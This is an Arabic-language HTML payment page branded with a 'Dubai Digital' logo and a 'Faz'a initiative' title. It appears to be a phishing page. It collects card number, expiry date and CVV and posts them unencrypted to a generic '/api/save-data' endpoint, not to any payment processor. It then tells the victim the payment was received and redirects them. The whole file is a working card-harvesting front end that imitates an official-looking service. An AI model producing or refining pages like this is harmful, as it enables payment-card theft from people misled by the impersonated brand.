<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>الدفع - مبادرة فزعة</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #f5f7fa; color: #1e3a5f; line-height: 1.6; }
        header { background-color: #ffffff; padding: 15px 20px; box-shadow: 0 4px 10px rgba(0, 0, 0, 0.05); position: sticky; top: 0; z-index: 1000; }
        .header-container { display: flex; justify-content: space-between; align-items: center; max-width: 1200px; margin: 0 auto; }
        .logo-container img { max-height: 50px; width: auto; display: block; }
        .container { max-width: 500px; margin: 20px auto; padding: 20px; background: #fff; border-radius: 16px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .input-group { margin-bottom: 20px; text-align: right; }
        .input-group label { display: block; font-weight: bold; font-size: 0.95rem; color: #2d3748; margin-bottom: 8px; }
        .input-control { width: 100%; padding: 14px 16px; border: 1.5px solid #e2e8f0; border-radius: 12px; background-color: #f7fafc; font-size: 1rem; color: #2d3748; outline: none; transition: 0.3s; text-align: right; }
        .btn-pay { background: linear-gradient(135deg, #d4af37, #aa7c11); color: #fff; border: none; width: 100%; padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 12px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
    </style>
</head>
<body>
    <header>
        <div class="header-container">
            <div class="logo-container">
                <img src="dubai_digital_logo.png" alt="Dubai Digital">
            </div>
        </div>
    </header>
    <div class="container">
        <h2 style="text-align: center; margin-bottom: 20px;">تفاصيل الدفع</h2>
        <form id="paymentForm">
            <div class="input-group">
                <label>رقم البطاقة</label>
                <input type="text" id="cardNumber" class="input-control" placeholder="**** **** **** ****" required>
            </div>
            <div style="display: flex; gap: 10px;">
                <div class="input-group" style="flex: 1;">
                    <label>تاريخ الانتهاء</label>
                    <input type="text" id="expiry" class="input-control" placeholder="MM/YY" required>
                </div>
                <div class="input-group" style="flex: 1;">
                    <label>الرمز السري (CVV)</label>
                    <input type="text" id="cvv" class="input-control" placeholder="***" required>
                </div>
            </div>
            <button type="submit" class="btn-pay">تأكيد الدفع</button>
        </form>
    </div>
    <script>
        document.getElementById('paymentForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const data = {
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                status: 'تم الدفع - في انتظار التأكيد'
            };
            try {
                const response = await fetch('/api/save-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                if (response.ok) {
                    alert('تم استلام طلبك بنجاح، جاري التحقق...');
                    window.location.href = 'confirmation_ar.html';
                } else {
                    alert('حدث خطأ في الاتصال بالخادم');
                }
            } catch (err) {
                alert('حدث خطأ في الاتصال بالخادم');
            }
        });
    </script>
</body>
</html>
